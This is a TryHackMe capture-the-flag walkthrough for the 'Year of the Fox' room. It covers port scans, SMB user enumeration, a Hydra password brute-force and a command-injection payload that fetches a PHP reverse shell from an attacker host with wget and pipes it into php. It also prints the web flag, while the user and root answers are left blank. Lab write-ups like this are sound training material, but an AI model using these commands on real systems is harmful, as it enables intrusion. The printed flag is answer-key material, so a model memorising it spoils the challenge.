# Year of the Fox

## Overview

Don't underestimate the sly old fox...

Room link: https://tryhackme.com/room/yotf
Difficulty: **Hard**

## Walkthrough

Starting an initial Nmap scan:

```console
$ nmap -p- -T4 10.10.227.75 -oN scans/initial.nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-01 16:54 GMT
Nmap scan report for 10.10.227.75
Host is up (0.035s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 39.39 seconds
```

Running a specific port scan:

```console
$ sudo nmap -p 80,139,445 -T4 -A 10.10.227.75 -oN scans/open_ports.nmap
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-01 16:56 GMT
Nmap scan report for 10.10.227.75
Host is up (0.069s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  ����      V      Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
| smb2-time: 
|   date: 2024-01-01T16:56:20
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 0s, deviation: 1s, median: -1s
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2024-01-01T16:56:20+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   33.14 ms 10.8.0.1
2   99.35 ms 10.10.227.75

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.88 seconds
```

Navigating to the website, we are asked to authenticate and given a `HTTP 401 Unauthorized` error. As we don't have any usernames, we need must enumerate the host further. Running `enum4linux` provides more insight into the shares on the host and the usernames:

![Year of the Fox - enum4linux shares](tryhackme/images/yotf_enum4linux_shares.png)

![Year of the Fox - enum4linux users](tryhackme/images/yotf_enum4linux_users.png)

With these two users we can bruteforce the authentication page with Hydra. Note, that each time the machine reboots, the password for the user changes

```console
$ hydra -L users.lst -P /usr/share/wordlists/rockyou.txt 10.10.195.56 http-head / 
```

![Year of the Fox - rascal Credentials](tryhackme/images/yotf_rascal_creds.png)

Logging in with these credentials shows a search interface that lists the contents of directories:

![Year of the Fox - Rascal's Search System](tryhackme/images/yotf_rascal_search_system.png)

![Year of the Fox - Directory Listing](tryhackme/images/yotf_directory_listing.png)

We can bypass the client-side filtering by using BurpSuite.

After some fuzzing of special characters, we see `\` is still valid and is not removed by the filter. We can therefore upload a [reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) onto the host and catch a callback via Netcat:

```console
# Attacker Machine
$ python3 -m http.server <PORT>
```

```
\"; wget -O - -q http://<ATTACKER_IP>:<PORT>/revshell.php | php; \"
```

Once we make the above request via BurpSuite, we obtain a callback on our Netcat listener:

![Year of the Fox - Netcat Callback](tryhackme/images/yotf_nc_callback.png)

Navigating through the filesystem, we can obtain the web flag:

![Year of the Fox - Web Flag](tryhackme/images/yotf_web_flag.png)

-----

1. What is the **web** flag?

```
THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}
```

2. What is the **user** flag?

```

```

3. What is the **root** flag?

```

```
